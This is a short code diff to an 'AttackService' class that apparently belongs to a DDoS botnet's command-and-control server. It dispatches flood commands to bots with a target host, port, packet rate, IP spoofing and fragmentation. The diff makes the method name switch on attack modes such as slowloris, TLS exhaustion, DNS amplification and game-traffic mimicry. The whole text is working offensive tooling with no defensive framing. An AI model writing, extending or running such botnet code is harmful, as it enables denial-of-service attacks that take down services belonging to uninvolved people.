@@ -44,15 +44,18 @@ class AttackService:
             )
             s.add(task); await s.commit(); await s.refresh(task)
 
+            method = data.method.upper()
             for bot in available:
                 await manager.send_attack_command(str(bot.id), {
                     "id": str(task.id), "target": data.target_host, "port": data.target_port,
-                    "method": data.method, "duration": data.duration_secs,
+                    "method": method, "duration": data.duration_secs,
                     "pps": data.pps_per_bot, "threads": bot.max_threads,
                     "spoof_mode": data.spoof_mode, "fragmentation": int(data.fragmentation),
-                    "slowloris": int(data.slowloris), "tls_exhaust": int(data.tls_exhaust),
-                    "dns_amp": int(data.dns_amp), "game_mimic": int(data.game_mimic),
-                    "mega_mode": int(data.mega_mode),
+                    "slowloris": int(data.slowloris or method == "SLOWLORIS"),
+                    "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
+                    "dns_amp": int(data.dns_amp or method == "DNS_AMP"),
+                    "game_mimic": int(data.game_mimic or method == "GAME_MIMIC"),
+                    "mega_mode": int(data.mega_mode or method == "MEGA"),
                 })
             return task
 
